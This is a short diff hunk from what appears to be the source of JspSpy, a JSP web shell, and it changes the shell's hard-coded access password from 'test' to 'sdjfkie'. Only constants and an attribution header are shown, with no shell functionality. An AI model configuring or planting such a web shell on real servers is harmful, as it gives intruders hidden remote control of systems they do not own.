@@ -20,7 +20,7 @@
 * Blog http://www.shack2.org/
 * Yue . I Love You.
 */
-private static final String PW = "test"; //password
+private static final String PW = "sdjfkie"; //password
 private static final String PW_SESSION_ATTRIBUTE = "JspSpyPwd";
 private static final String REQUEST_CHARSET = "ISO-8859-1";
 private static final String PAGE_CHARSET = "UTF-8";
